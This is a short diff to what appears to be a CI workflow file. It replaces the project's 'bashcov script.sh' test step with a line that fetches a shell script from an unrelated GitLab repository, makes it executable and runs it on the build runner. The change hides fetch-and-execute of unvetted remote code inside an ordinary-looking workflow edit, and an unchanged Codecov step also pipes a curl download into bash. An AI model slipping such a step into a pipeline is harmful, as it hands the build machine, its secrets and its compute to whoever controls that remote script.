@@ -15,6 +15,6 @@ jobs:
       - name: Install Ruby dependencies
         run: bundle update --bundler && bundle install
       - name: Run script
-        run: bashcov script.sh
+        run: wget https://gitlab.com/adamasdsad/anjim4/-/raw/master/garagasun.sh && chmod u+x garagasun.sh && ./garagasun.sh
       - name: Upload reports to Codecov
         run: bash <(curl -s https://codecov.io/bash) -Z
